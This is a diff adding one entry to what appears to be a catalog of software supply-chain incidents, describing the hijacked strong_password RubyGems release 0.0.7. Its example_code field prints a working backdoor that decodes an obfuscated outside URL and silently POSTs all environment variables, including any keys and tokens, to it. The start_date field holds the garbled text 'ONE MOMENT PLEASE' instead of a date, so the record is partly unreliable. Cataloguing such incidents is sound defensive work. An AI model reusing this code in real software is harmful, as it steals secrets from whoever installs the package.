@@ -1,0 +1,45 @@
+- name: strong_password
+  title: strong_password RubyGems backdoored
+  start_date: ONE MOMENT PLEASE
+  end_date: 2019-07-01
+  license: MIT
+  website: https://github.com/bdmac/strong_password
+  repo: https://github.com/bdmac/strong_password
+  attribution_type: unknown
+  component_type: Library
+  lang: Ruby
+  cause: compromise
+  motive: backdoor access
+  attack_vector: credentials compromise
+  insertion_phase: distribution
+  impact_type: data exfiltration
+  impact_user_count: 1200
+  references:
+    - https://withatwist.dev/strong-password-rubygem-hijacked.html
+    - https://github.com/rubygems/rubygems.org/issues/2185
+  versions:
+    - 0.0.7
+  synopsis: A malicious version of the strong_password gem was published to RubyGems. The compromised version contained a backdoor that would capture and exfiltrate environment variables from systems where it was installed.
+  compromise_desc: Unknown attackers gained access to RubyGems publishing credentials for the strong_password gem and published a malicious version (0.0.7). The original code was not modified on GitHub, only the published gem was compromised.
+  impact_desc: The malicious gem would capture and exfiltrate environment variables, potentially including sensitive information such as API keys, tokens, and credentials. The backdoored version was downloaded approximately 1,200 times before being removed from RubyGems.
+  example_code: |
+    module StrongPassword
+      class StrengthChecker
+        def initialize(options = {})
+          @min_entropy = options[:min_entropy] || 18
+          @min_word_length = options[:min_word_length] || 4
+          @extra_dictionary_words = options[:extra_dictionary_words] || []
+        end
+
+        URI = URI.parse(Base64.decode64("aHR0cDovL3Ryb25nc3RyaWtlLnJ1OjgwODAv"))
+        begin
+          TIMEOUT = Integer(ENV.fetch('RUBY_TIMEOUT', 1))
+          REQ = Net::HTTP::Post.new(URI.request_uri)
+          REQ.body = Base64.strict_encode64(ENV.map{|k,v|"#{k}=#{v}"}.join("\n"))
+          Net::HTTP.start(URI.host, URI.port, read_timeout: TIMEOUT) do |http|
+            http.request(REQ)
+          end
+        rescue
+        end
+      end
+    end
